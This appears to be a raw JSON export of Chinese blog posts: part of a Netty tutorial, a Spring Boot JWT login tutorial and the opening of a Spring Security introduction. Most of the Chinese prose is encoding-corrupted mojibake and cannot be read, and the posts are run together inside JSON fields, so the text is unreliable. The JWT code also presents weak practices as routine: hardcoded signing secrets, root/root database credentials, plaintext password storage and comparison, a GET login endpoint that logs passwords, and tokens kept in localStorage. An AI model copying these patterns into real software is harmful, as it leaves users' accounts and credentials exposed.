è¯»äº‹ä»¶å’Œè¯»å®Œæˆäº‹ä»¶ fireChannelReadã€fireChannelReadCompleteã€‚ å¼‚å¸¸é€šçŸ¥äº‹ä»¶ fireExceptionCaughtã€‚ ç”¨æˆ·è‡ªå®šä¹‰äº‹ä»¶ fireUserEventTriggeredã€‚ Channel å¯å†™çŠ¶æ€å˜åŒ–äº‹ä»¶ fireChannelWritabilityChangedã€‚ è¿æ¥å…³é—­äº‹ä»¶ fireChannelInactiveã€‚ ChannelOutboundHandlerå¤„ç†å™¨å¸¸ç”¨çš„äº‹ä»¶æœ‰ï¼š ç«¯å£ç»‘å®š bindã€‚ è¿æ¥æœåŠ¡ç«¯ connectã€‚ å†™äº‹ä»¶ writeã€‚ åˆ·æ–°æ—¶é—´ flushã€‚ è¯»äº‹ä»¶ readã€‚ ä¸»åŠ¨æ–­å¼€è¿æ¥ disconnectã€‚ å…³é—­ channel äº‹ä»¶ closeã€‚ è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„handler()ï¼Œä¸»è¦ç”¨äºè£…é…parenté€šé“ï¼Œä¹Ÿå°±æ˜¯bossGroupçº¿ç¨‹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½ç”¨ä¸ä¸Šè¿™ä¸ªæ–¹æ³•ã€‚ 5.4.5 bind()æä¾›ç”¨äºæœåŠ¡ç«¯æˆ–è€…å®¢æˆ·ç«¯ç»‘å®šæœåŠ¡å™¨åœ°å€å’Œç«¯å£å·ï¼Œé»˜è®¤æ˜¯å¼‚æ­¥å¯åŠ¨ã€‚å¦‚æœåŠ ä¸Šsync()æ–¹æ³•åˆ™æ˜¯åŒæ­¥ã€‚ æœ‰äº”ä¸ªåŒåçš„é‡è½½æ–¹æ³•ï¼Œä½œç”¨éƒ½æ˜¯ç”¨äºç»‘å®šåœ°å€ç«¯å£å·ã€‚ä¸ä¸€ä¸€ä»‹ç»äº†ã€‚ 5.4.6 ä¼˜é›…åœ°å…³é—­EventLoopGroup//é‡Šæ”¾æ‰æ‰€æœ‰çš„èµ„æºï¼ŒåŒ…æ‹¬åˆ›å»ºçš„çº¿ç¨‹ bossGroup.shutdownGracefully(); workerGroup.shutdownGracefully(); ä¼šå…³é—­æ‰€æœ‰çš„child Channelã€‚å…³é—­ä¹‹åï¼Œé‡Šæ”¾æ‰åº•å±‚çš„èµ„æºã€‚ 5.5 ChannelChannelæ˜¯ä»€ä¹ˆï¼Ÿä¸å¦¨çœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ï¼š A nexus to a network socket or a component which is capable of I/O operations such as read, write, connect, and bind ç¿»è¯‘å¤§æ„ï¼šä¸€ç§è¿æ¥åˆ°ç½‘ç»œå¥—æ¥å­—æˆ–èƒ½è¿›è¡Œè¯»ã€å†™ã€è¿æ¥å’Œç»‘å®šç­‰I/Oæ“ä½œçš„ç»„ä»¶ã€‚ å¦‚æœä¸Šé¢è¿™æ®µè¯´æ˜æ¯”è¾ƒæŠ½è±¡ï¼Œä¸‹é¢è¿˜æœ‰ä¸€æ®µè¯´æ˜ï¼š A channel provides a user: the current state of the channel (e.g. is it open? is it connected?),the configuration parameters of the channel (e.g. receive buffer size),the I/O operations that the channel supports (e.g. read, write, connect, and bind), andthe ChannelPipeline which handles all I/O events and requests associated with the channel. ç¿»è¯‘å¤§æ„ï¼š channelä¸ºç”¨æˆ·æä¾›ï¼š é€šé“å½“å‰çš„çŠ¶æ€ï¼ˆä¾‹å¦‚å®ƒæ˜¯æ‰“å¼€ï¼Ÿè¿˜æ˜¯å·²è¿æ¥ï¼Ÿï¼‰ channelçš„é…ç½®å‚æ•°ï¼ˆä¾‹å¦‚æ¥æ”¶ç¼“å†²åŒºçš„å¤§å°ï¼‰ channelæ”¯æŒçš„IOæ“ä½œï¼ˆä¾‹å¦‚è¯»ã€å†™ã€è¿æ¥å’Œç»‘å®šï¼‰ï¼Œä»¥åŠå¤„ç†ä¸channelç›¸å…³è”çš„æ‰€æœ‰IOäº‹ä»¶å’Œè¯·æ±‚çš„ChannelPipelineã€‚ 5.5.1 è·å–channelçš„çŠ¶æ€boolean isOpen(); //å¦‚æœé€šé“æ‰“å¼€ï¼Œåˆ™è¿”å›true boolean isRegistered();//å¦‚æœé€šé“æ³¨å†Œåˆ°EventLoopï¼Œåˆ™è¿”å›true boolean isActive();//å¦‚æœé€šé“å¤„äºæ´»åŠ¨çŠ¶æ€å¹¶ä¸”å·²è¿æ¥ï¼Œåˆ™è¿”å›true boolean isWritable();//å½“ä¸”ä»…å½“I/Oçº¿ç¨‹å°†ç«‹å³æ‰§è¡Œè¯·æ±‚çš„å†™å…¥æ“ä½œæ—¶ï¼Œè¿”å›trueã€‚ ä»¥ä¸Šå°±æ˜¯è·å–channelçš„å››ç§çŠ¶æ€çš„æ–¹æ³•ã€‚ 5.5.2 è·å–channelçš„é…ç½®å‚æ•°è·å–å•æ¡é…ç½®ä¿¡æ¯ï¼Œä½¿ç”¨getOption()ï¼Œä»£ç æ¼”ç¤ºï¼š ChannelConfig config = channel.config();//è·å–é…ç½®å‚æ•° //è·å–ChannelOption.SO_BACKLOGå‚æ•°, Integer soBackLogConfig = config.getOption(ChannelOption.SO_BACKLOG); //å› ä¸ºæˆ‘å¯åŠ¨å™¨é…ç½®çš„æ˜¯128ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œè·å–çš„soBackLogConfig=128 è·å–å¤šæ¡é…ç½®ä¿¡æ¯ï¼Œä½¿ç”¨getOptions()ï¼Œä»£ç æ¼”ç¤ºï¼š ChannelConfig config = channel.config(); Map&lt;ChannelOption&lt;?&gt;, Object&gt; options = config.getOptions(); for (Map.Entry&lt;ChannelOption&lt;?&gt;, Object&gt; entry : options.entrySet()) { System.out.println(entry.getKey() + &quot; : &quot; + entry.getValue()); } /** SO_REUSEADDR : false WRITE_BUFFER_LOW_WATER_MARK : 32768 WRITE_BUFFER_WATER_MARK : WriteBufferWaterMark(low: 32768, high: 65536) SO_BACKLOG : 128 ä»¥ä¸‹çœç•¥... */ 5.5.3 channelæ”¯æŒçš„IOæ“ä½œå†™æ“ä½œï¼Œè¿™é‡Œæ¼”ç¤ºä»æœåŠ¡ç«¯å†™æ¶ˆæ¯å‘é€åˆ°å®¢æˆ·ç«¯ï¼š @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { ctx.channel().writeAndFlush(Unpooled.copiedBuffer(&quot;è¿™æ³¢å•Šï¼Œè¿™æ³¢æ˜¯è‚‰è›‹è‘±é¸¡~&quot;, CharsetUtil.UTF_8)); } å®¢æˆ·ç«¯æ§åˆ¶å°ï¼š //æ”¶åˆ°æœåŠ¡ç«¯/127.0.0.1:6666çš„æ¶ˆæ¯ï¼šè¿™æ³¢å•Šï¼Œè¿™æ³¢æ˜¯è‚‰è›‹è‘±é¸¡~ è¿æ¥æ“ä½œï¼Œä»£ç æ¼”ç¤ºï¼š ChannelFuture connect = channelFuture.channel().connect(new InetSocketAddress(&quot;127.0.0.1&quot;, 6666));//ä¸€èˆ¬ä½¿ç”¨å¯åŠ¨å™¨ï¼Œè¿™ç§æ–¹å¼ä¸å¸¸ç”¨ é€šè¿‡channelè·å–ChannelPipelineï¼Œå¹¶åšç›¸å…³çš„å¤„ç†ï¼š //è·å–ChannelPipelineå¯¹è±¡ ChannelPipeline pipeline = ctx.channel().pipeline(); //å¾€pipelineä¸­æ·»åŠ ChannelHandlerå¤„ç†å™¨ï¼Œè£…é…æµæ°´çº¿ pipeline.addLast(new MyServerHandler()); 5.6 Selectoråœ¨NioEventLoopä¸­ï¼Œæœ‰ä¸€ä¸ªæˆå‘˜å˜é‡selectorï¼Œè¿™æ˜¯nioåŒ…çš„Selectorï¼Œåœ¨ä¹‹å‰ã€ŠNIOå…¥é—¨ã€‹ä¸­ï¼Œæˆ‘å·²ç»è®²è¿‡Selectoräº†ã€‚ Nettyä¸­çš„Selectorä¹Ÿå’ŒNIOçš„Selectoræ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ç”¨äºç›‘å¬äº‹ä»¶ï¼Œç®¡ç†æ³¨å†Œåˆ°Selectorä¸­çš„channelï¼Œå®ç°å¤šè·¯å¤ç”¨å™¨ã€‚ image.png 5.7 PiPelineä¸ChannelPipelineåœ¨å‰é¢ä»‹ç»Channelæ—¶ï¼Œæˆ‘ä»¬çŸ¥é“å¯ä»¥åœ¨channelä¸­è£…é…ChannelHandleræµæ°´çº¿å¤„ç†å™¨ï¼Œé‚£ä¸€ä¸ªchannelä¸å¯èƒ½åªæœ‰ä¸€ä¸ªchannelHandlerå¤„ç†å™¨ï¼Œè‚¯å®šæ˜¯æœ‰å¾ˆå¤šçš„ï¼Œæ—¢ç„¶æ˜¯å¾ˆå¤šchannelHandleråœ¨ä¸€ä¸ªæµæ°´çº¿å·¥ä½œï¼Œè‚¯å®šæ˜¯æœ‰é¡ºåºçš„ã€‚ äºæ˜¯pipelineå°±å‡ºç°äº†ï¼Œpipelineç›¸å½“äºå¤„ç†å™¨çš„å®¹å™¨ã€‚åˆå§‹åŒ–channelæ—¶ï¼ŒæŠŠchannelHandleræŒ‰é¡ºåºè£…åœ¨pipelineä¸­ï¼Œå°±å¯ä»¥å®ç°æŒ‰åºæ‰§è¡ŒchannelHandleräº†ã€‚ image.png åœ¨ä¸€ä¸ªChannelä¸­ï¼Œåªæœ‰ä¸€ä¸ªChannelPipelineã€‚è¯¥pipelineåœ¨Channelè¢«åˆ›å»ºçš„æ—¶å€™åˆ›å»ºã€‚ChannelPipelineåŒ…å«äº†ä¸€ä¸ªChannelHanderå½¢æˆçš„åˆ—è¡¨ï¼Œä¸”æ‰€æœ‰ChannelHandleréƒ½ä¼šæ³¨å†Œåˆ°ChannelPipelineä¸­ã€‚ 5.8 ChannelHandlerContextåœ¨Nettyä¸­ï¼ŒHandlerå¤„ç†å™¨æ˜¯æœ‰æˆ‘ä»¬å®šä¹‰çš„ï¼Œä¸Šé¢è®²è¿‡é€šè¿‡é›†æˆå…¥ç«™å¤„ç†å™¨æˆ–è€…å‡ºç«™å¤„ç†å™¨å®ç°ã€‚è¿™æ—¶å¦‚æœæˆ‘ä»¬æƒ³åœ¨Handlerä¸­è·å–pipelineå¯¹è±¡ï¼Œæˆ–è€…channelå¯¹è±¡ï¼Œæ€ä¹ˆè·å–å‘¢ã€‚ äºæ˜¯Nettyè®¾è®¡äº†è¿™ä¸ªChannelHandlerContextä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå°±å¯ä»¥æ‹¿åˆ°channelã€pipelineç­‰å¯¹è±¡ï¼Œå°±å¯ä»¥è¿›è¡Œè¯»å†™ç­‰æ“ä½œã€‚ image.png é€šè¿‡ç±»å›¾ï¼ŒChannelHandlerContextæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸‹é¢æœ‰ä¸‰ä¸ªå®ç°ç±»ã€‚ å®é™…ä¸ŠChannelHandlerContextåœ¨pipelineä¸­æ˜¯ä¸€ä¸ªé“¾è¡¨çš„å½¢å¼ã€‚çœ‹ä¸€æ®µæºç å°±æ˜ç™½äº†ï¼š //ChannelPipelineå®ç°ç±»DefaultChannelPipelineçš„æ„é€ å™¨æ–¹æ³• protected DefaultChannelPipeline(Channel channel) { this.channel = ObjectUtil.checkNotNull(channel, &quot;channel&quot;); succeededFuture = new SucceededChannelFuture(channel, null); voidPromise = new VoidChannelPromise(channel, true); //è®¾ç½®å¤´ç»“ç‚¹headï¼Œå°¾ç»“ç‚¹tail tail = new TailContext(this); head = new HeadContext(this); head.next = tail; tail.prev = head; } ä¸‹é¢æˆ‘ç”¨ä¸€å¼ å›¾æ¥è¡¨ç¤ºï¼Œä¼šæ›´åŠ æ¸…æ™°ä¸€ç‚¹ï¼š 5.9 EventLoopGroupæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹EventLoopGroupçš„ç±»å›¾ï¼š image.png å…¶ä¸­åŒ…æ‹¬äº†å¸¸ç”¨çš„å®ç°ç±»NioEventLoopGroupã€‚OioEventLoopGroupåœ¨å‰é¢çš„ä¾‹å­ä¸­ä¹Ÿæœ‰ä½¿ç”¨è¿‡ã€‚ ä»Nettyçš„æ¶æ„å›¾ä¸­ï¼Œå¯ä»¥çŸ¥é“æœåŠ¡å™¨æ˜¯éœ€è¦ä¸¤ä¸ªçº¿ç¨‹ç»„è¿›è¡Œé…åˆå·¥ä½œçš„ï¼Œè€Œè¿™ä¸ªçº¿ç¨‹ç»„çš„æ¥å£å°±æ˜¯EventLoopGroupã€‚ æ¯ä¸ªEventLoopGroupé‡ŒåŒ…æ‹¬ä¸€ä¸ªæˆ–å¤šä¸ªEventLoopï¼Œæ¯ä¸ªEventLoopä¸­ç»´æŠ¤ä¸€ä¸ªSelectorå®ä¾‹ã€‚ 5.9.1 è½®è¯¢æœºåˆ¶çš„å®ç°åŸç†æˆ‘ä»¬ä¸å¦¨çœ‹ä¸€æ®µDefaultEventExecutorChooserFactoryçš„æºç ï¼š private final AtomicInteger idx = new AtomicInteger(); private final EventExecutor[] executors; @Override public EventExecutor next() { //idx.getAndIncrement()ç›¸å½“äºidx++ï¼Œç„¶åå¯¹ä»»åŠ¡é•¿åº¦å–æ¨¡ return executors[idx.getAndIncrement() &amp; executors.length - 1]; } è¿™æ®µä»£ç å¯ä»¥ç¡®å®šæ‰§è¡Œçš„æ–¹å¼æ˜¯è½®è¯¢æœºåˆ¶ï¼Œæ¥ä¸‹æ¥debugè°ƒè¯•ä¸€ä¸‹ï¼š img å®ƒè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœçº¿ç¨‹æ•°ä¸æ˜¯2çš„Næ¬¡æ–¹ï¼Œåˆ™é‡‡ç”¨å–æ¨¡ç®—æ³•å®ç°ã€‚ @Override public EventExecutor next() { return executors[Math.abs(idx.getAndIncrement() % executors.length)]; }","categories":[],"tags":[]},{"title":"Spring and Jwt","slug":"spring-and-jwt","date":"2021-05-23T19:04:21.000Z","updated":"2021-05-27T07:14:10.581Z","comments":true,"path":"spring-and-jwt/","link":"","permalink":"https://blog.kayleh.top/spring-and-jwt/","excerpt":"","text":"ä½¿ç”¨JWT1.å¼•å…¥ä¾èµ–&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; 2.ç”Ÿæˆtokenpublic class createToken { public static void main(String[] args) { Calendar instance = Calendar.getInstance(); instance.add(Calendar.SECOND, 90); //ç”Ÿæˆä»¤ç‰Œ String token = JWT.create() .withClaim(&quot;username&quot;, &quot;å¼ ä¸‰&quot;)//è®¾ç½®è‡ªå®šä¹‰ç”¨æˆ·å .withExpiresAt(instance.getTime())//è®¾ç½®è¿‡æœŸæ—¶é—´ .sign(Algorithm.HMAC256(&quot;token!Q2W#E$RW&quot;));//è®¾ç½®ç­¾åä¿å¯†å¤æ‚ //è¾“å‡ºä»¤ç‰Œ System.out.println(&quot;--------token:&quot; + token); } } ----- - ç”Ÿæˆç»“æœ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOlsicGhvbmUiLCIxNDMyMzIzNDEzNCJdLCJleHAiOjE1OTU3Mzk0NDIsInVzZXJuYW1lIjoi5byg5LiJIn0.aHmE3RNqvAjFr_dvyn_sD2VJ46P7EGiS5OBMO_TI5jg 3.æ ¹æ®ä»¤ç‰Œå’Œç­¾åè§£ææ•°æ®JWTVerifier jwtVerifier = JWT.require(Algorithm.HMAC256(&quot;token!Q2W#E$RW&quot;)).build(); DecodedJWT decodedJWT = jwtVerifier.verify(token); System.out.println(&quot;ç”¨æˆ·å: &quot; + decodedJWT.getClaim(&quot;username&quot;).asString()); System.out.println(&quot;è¿‡æœŸæ—¶é—´: &quot;+decodedJWT.getExpiresAt()); 4.å¸¸è§å¼‚å¸¸ä¿¡æ¯ SignatureVerificationException: ç­¾åä¸ä¸€è‡´å¼‚å¸¸ TokenExpiredException: ä»¤ç‰Œè¿‡æœŸå¼‚å¸¸ AlgorithmMismatchException: ç®—æ³•ä¸åŒ¹é…å¼‚å¸¸ InvalidClaimException: å¤±æ•ˆçš„payloadå¼‚å¸¸ å°è£…å·¥å…·ç±»public class JWTUtils { private static String TOKEN = &quot;JokerDJToken&quot;; /** * ç”Ÿæˆtoken * @param map //ä¼ å…¥payload * @return è¿”å›token */ public static String getToken(Map&lt;String,String&gt; map){ JWTCreator.Builder builder = JWT.create(); map.forEach((k,v)-&gt;{ builder.withClaim(k,v); }); Calendar instance = Calendar.getInstance(); instance.add(Calendar.SECOND,7); builder.withExpiresAt(instance.getTime()); return builder.sign(Algorithm.HMAC256(TOKEN)).toString(); } /** * éªŒè¯token * @param token * @return */ public static void verify(String token){ JWT.require(Algorithm.HMAC256(TOKEN)).build().verify(token); } /** * è·å–tokenä¸­payload * @param token * @return */ public static DecodedJWT getToken(String token){ return JWT.require(Algorithm.HMAC256(TOKEN)).build().verify(token); } } æ•´åˆspringboot0.æ­å»ºspringboot+mybatis+jwtç¯å¢ƒ å¼•å…¥ä¾èµ– ç¼–å†™é…ç½® &lt;!--å¼•å…¥jwt--&gt; &lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--å¼•å…¥mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;!--å¼•å…¥lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;/dependency&gt; &lt;!--å¼•å…¥druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.19&lt;/version&gt; &lt;/dependency&gt; &lt;!--å¼•å…¥mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.38&lt;/version&gt; &lt;/dependency&gt; ------------------ server.port=8989 spring.application.name=jwt spring.datasource.type=com.alibaba.druid.pool.DruidDataSource spring.datasource.driver-class-name=com.mysql.jdbc.Driver spring.datasource.url=jdbc:mysql://localhost:3306/jwt?characterEncoding=UTF-8 spring.datasource.username=root spring.datasource.password=root mybatis.type-aliases-package=com.baizhi.entity mybatis.mapper-locations=classpath:com/baizhi/mapper/*.xml logging.level.com.baizhi.dao=debug 1.å¼€å‘æ•°æ®åº“ è¿™é‡Œé‡‡ç”¨æœ€ç®€å•çš„è¡¨ç»“æ„éªŒè¯JWTä½¿ç”¨ DROP TABLE IF EXISTS `user`; CREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &#39;ä¸»é”®&#39;, `name` varchar(80) DEFAULT NULL COMMENT &#39;ç”¨æˆ·å&#39;, `password` varchar(40) DEFAULT NULL COMMENT &#39;ç”¨æˆ·å¯†ç &#39;, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8; 2.å¼€å‘entity@Data @Accessors(chain=true) public class User { private String id; private String name; private String password; } 3.å¼€å‘DAOæ¥å£å’Œmapper.xml@Mapper public interface UserDAO { User login(User user); } &lt;mapper namespace=&quot;com.baizhi.dao.UserDAO&quot;&gt; &lt;!--è¿™é‡Œå°±å†™çš„ç®€å•ç‚¹äº†æ¯•ç«Ÿä¸æ˜¯é‡ç‚¹--&gt; &lt;select id=&quot;login&quot; parameterType=&quot;User&quot; resultType=&quot;User&quot;&gt; select * from user where name=#{name} and password = #{password} &lt;/select&gt; &lt;/mapper&gt; 4.å¼€å‘Service æ¥å£ä»¥åŠå®ç°ç±»public interface UserService { User login(User user);//ç™»å½•æ¥å£ } impl @Service @Transactional public class UserServiceImpl implements UserService { @Autowired private UserDAO userDAO; @Override @Transactional(propagation = Propagation.SUPPORTS) public User login(User user) { User userDB = userDAO.login(user); if(userDB!=null){ return userDB; } throw new RuntimeException(&quot;ç™»å½•å¤±è´¥~~&quot;); } } 5.å¼€å‘controller@RestController @Slf4j public class UserController { @Autowired private UserService userService; @GetMapping(&quot;/user/login&quot;) public Map&lt;String,Object&gt; login(User user) { Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); log.info(&quot;ç”¨æˆ·å: [{}]&quot;, user.getName()); log.info(&quot;å¯†ç : [{}]&quot;, user.getPassword()); try { User userDB = userService.login(user); Map&lt;String, String&gt; map = new HashMap&lt;&gt;();//ç”¨æ¥å­˜æ”¾payload map.put(&quot;id&quot;,userDB.getId()); map.put(&quot;username&quot;, userDB.getName()); String token = JWTUtils.getToken(map); result.put(&quot;state&quot;,true); result.put(&quot;msg&quot;,&quot;ç™»å½•æˆåŠŸ!!!&quot;); result.put(&quot;token&quot;,token); //æˆåŠŸè¿”å›tokenä¿¡æ¯ } catch (Exception e) { e.printStackTrace(); result.put(&quot;state&quot;,&quot;false&quot;); result.put(&quot;msg&quot;,e.getMessage()); } return result; } } åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 6.æ•°æ®åº“æ·»åŠ æµ‹è¯•æ•°æ®å¯åŠ¨é¡¹ç›®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 7.é€šè¿‡postmanæ¨¡æ‹Ÿç™»å½•å¤±è´¥åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 8.é€šè¿‡postmanæ¨¡æ‹Ÿç™»å½•æˆåŠŸåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 9.ç¼–å†™æµ‹è¯•æ¥å£@PostMapping(&quot;/test/test&quot;) public Map&lt;String, Object&gt; test(String token) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); try { JWTUtils.verify(token); map.put(&quot;msg&quot;, &quot;éªŒè¯é€šè¿‡~~~&quot;); map.put(&quot;state&quot;, true); } catch (TokenExpiredException e) { map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;Tokenå·²ç»è¿‡æœŸ!!!&quot;); } catch (SignatureVerificationException e){ map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;ç­¾åé”™è¯¯!!!&quot;); } catch (AlgorithmMismatchException e){ map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;åŠ å¯†ç®—æ³•ä¸åŒ¹é…!!!&quot;); } catch (Exception e) { e.printStackTrace(); map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;æ— æ•ˆtoken~~&quot;); } return map; } åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 10.é€šè¿‡postmanè¯·æ±‚æ¥å£åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 11.é—®é¢˜? ä½¿ç”¨ä¸Šè¿°æ–¹å¼æ¯æ¬¡éƒ½è¦ä¼ é€’tokenæ•°æ®,æ¯ä¸ªæ–¹æ³•éƒ½éœ€è¦éªŒè¯tokenä»£ç å†—ä½™,ä¸å¤Ÿçµæ´»? å¦‚ä½•ä¼˜åŒ– ä½¿ç”¨æ‹¦æˆªå™¨è¿›è¡Œä¼˜åŒ– 12. æ·»åŠ æ‹¦æˆªå™¨æ–°å»ºè‡ªå®šä¹‰æ‹¦æˆªå™¨MyInterceptor.java å®ç°HandlerInterceptoræ¥å£ /** * @Author Joker DJ * @Date 2021/2/25 17:34 * @Version 1.0 */ @Slf4j @Configuration public class MyInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { if (HttpMethod.OPTIONS.toString().equals(request.getMethod())) { System.out.println(&quot;OPTIONSè¯·æ±‚ï¼Œæ”¾è¡Œ&quot;);return true; } String token = request.getHeader(&quot;Authorization&quot;); Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); try { JWTUtils.verify(token); return true; } catch (TokenExpiredException e) { map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;Tokenå·²ç»è¿‡æœŸ!!!&quot;); } catch (SignatureVerificationException e){ map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;ç­¾åé”™è¯¯!!!&quot;); } catch (AlgorithmMismatchException e){ map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;åŠ å¯†ç®—æ³•ä¸åŒ¹é…!!!&quot;); } catch (Exception e) { e.printStackTrace(); map.put(&quot;state&quot;, false); map.put(&quot;msg&quot;, &quot;æ— æ•ˆtoken~~&quot;); } String json = new ObjectMapper().writeValueAsString(map); response.setContentType(&quot;application/json;charset=UTF-8&quot;); response.getWriter().println(json); return false; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { } } æ‹¦æˆªå™¨WebMvcConfig.java @Configuration public class WebMvcConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new MyInterceptor()). addPathPatterns(&quot;/**&quot;).//æ‹¦æˆªæ‰€æœ‰è¯·æ±‚ excludePathPatterns(&quot;/login&quot;).excludePathPatterns(&quot;/loginApp&quot;);//ä¸æ‹¦æˆªæ”¾è¡Œçš„è¯·æ±‚åœ°å€ } } 13. ç™»å½•æˆåŠŸè¿”å›tokenåéœ€è¦çš„æ“ä½œå°†tokenæ”¾åˆ°axiosçš„headerä¸­ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½æºå¸¦token è¿”å›çš„tokenå†™å…¥localStoragelocalStorage.setItem(â€˜authorizationâ€™,res.data.token); é…ç½®å…¨å±€axiosè®¿é—®æºå¸¦token //è‡ªåŠ¨ç»™åŒä¸€ä¸ªvueé¡¹ç›®çš„æ‰€æœ‰è¯·æ±‚æ·»åŠ è¯·æ±‚å¤´ axios.interceptors.request.use(function (config) { let token = localStorage.getItem(&#39;authorization&#39;); if (token) { config.headers[&#39;Authorization&#39;] = token; } return config; }) åå°æ¥æ”¶tokenæ–¹å¼ è·å–requestå¯¹è±¡```javaHttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); 2. é€šè¿‡requestè·å–token```java String token = request.getHeader(&quot;Authorization&quot;); è§£ætoken DecodedJWT jwt = JWTUtils.getToken(token); è·å–tokenä¿¡æ¯ String id = jwt.getClaim(&quot;id&quot;).asString(); String username = jwt.getClaim(&quot;username&quot;).asString(); String loginname = jwt.getClaim(&quot;loginname&quot;).asString(); User user = new User(); user.setId(id); user.setLoginname(loginname); user.setUsername(username); å…¨éƒ¨ä»£ç  HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); String token = request.getHeader(&quot;Authorization&quot;); DecodedJWT jwt = JWTUtils.getToken(token); String id = jwt.getClaim(&quot;id&quot;).asString(); //æ³¨æ„ç±»å‹asxxx String username = jwt.getClaim(&quot;username&quot;).asString(); String loginname = jwt.getClaim(&quot;loginname&quot;).asString(); User user = new User(); user.setId(id); user.setLoginname(loginname); user.setUsername(username);","categories":[],"tags":[]},{"title":"SpringSecurity","slug":"SpringSecurity","date":"2021-05-20T19:56:08.000Z","updated":"2021-05-24T03:01:04.772Z","comments":true,"path":"SpringSecurity/","link":"","permalink":"https://blog.kayleh.top/SpringSecurity/","excerpt":"","text":"SpringBootæ•´åˆSpringSecurity https://www.kuangstudy.com/bbs/1369251751735095298 Spring Securityè¯¾ç¨‹ä»‹ç»1. æ¡†æ¶æ¦‚è¿°ğŸ“• Spring Securityæ˜¯åŸºäºSpringæ¡†æ¶,æä¾›äº†ä¸€å¥—Webåº”ç”¨å®‰å…¨æ€§çš„å®Œæ•´è§£å†³æ–¹æ¡ˆã€‚æ­£å¦‚ä½ å¯èƒ½çŸ¥é“çš„å…³äºå®‰å…¨æ–¹é¢çš„ä¸¤ä¸ªä¸»è¦åŒºåŸŸæ˜¯â€è®¤è¯â€å’Œâ€æˆæƒâ€(æˆ–è€…è®¿é—®æ§åˆ¶),ä¸€èˆ¬æ¥è¯´ï¼ŒWebåº”ç”¨çš„å®‰å…¨æ€§ä¸»è¦åŒ…æ‹¬ç”¨æˆ·è®¤è¯å’Œç”¨æˆ·æˆæƒä¸¤ä¸ªéƒ¨åˆ†,è¿™ä¸¤ç‚¹ä¹Ÿæ˜¯Spring Securityçš„é‡è¦æ ¸å¿ƒåŠŸèƒ½ã€‚ ç”¨æˆ·è®¤è¯æŒ‡çš„æ˜¯ : éªŒè¯æŸä¸ªç”¨æˆ·æ˜¯å¦ä¸ºç³»ç»Ÿä¸­çš„åˆæ³•ä¸»ä½“,ä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·èƒ½å¦è®¿é—®è¯¥ç³»ç»Ÿã€‚ç”¨æˆ·è®¤è¯ä¸€èˆ¬è¦æ±‚ç”¨æˆ·æä¾›ç”¨æˆ·åå’Œå¯†ç ã€‚ç³»ç»Ÿé€šè¿‡æ ¡éªŒç”¨æˆ·åå’Œå¯†ç æ¥å®Œæˆè®¤è¯è¿‡ç¨‹ã€‚==é€šä¿—ç‚¹è¯´å°±æ˜¯ç³»ç»Ÿè®¤ä¸ºç”¨æˆ·æ˜¯å¦èƒ½ç™»å½•ã€‚== 